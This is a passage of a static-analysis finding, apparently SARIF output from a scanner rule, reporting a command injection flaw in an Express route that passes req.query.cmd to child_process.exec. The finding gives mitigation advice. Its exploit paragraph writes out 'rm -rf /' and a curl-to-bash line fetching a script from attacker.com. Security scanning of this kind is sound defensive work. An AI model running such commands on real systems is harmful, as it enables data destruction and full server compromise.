        {
          "ruleId": "javascript.express.express-child-process.express-child-process",
          "level": "error",
          "message": {
            "text": "[CRITICAL] The application directly executes a system command using `child_process.exec` where the `command` variable is taken directly from user input (`req.query.cmd`). This is a critical command injection vulnerability, allowing an attacker to execute arbitrary operating system commands on the server with the privileges of the Node.js process.\n\nExploit: An attacker can provide `cmd` as `ls -la /` to list directory contents, or `rm -rf /` to delete files (if permissions allow). More dangerously, `curl http://attacker.com/malicious_script.sh | bash` could download and execute a malicious script, leading to full system compromise.\n\nFix: Direct execution of user-supplied commands through `exec` is inherently dangerous. To mitigate this, user input should never be directly passed to `exec`. Instead, strictly validate and sanitize input against a whitelist of allowed commands and arguments. For executing specific programs, `child_process.execFile` or `child_process.spawn` with an array of arguments is generally safer as they avoid shell interpretation. Ideally, re-architect the application to avoid executing external commands based on user input entirely."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/test-vuln-2.js",
                  "uriBaseId": "%SRCROOT%"
                },
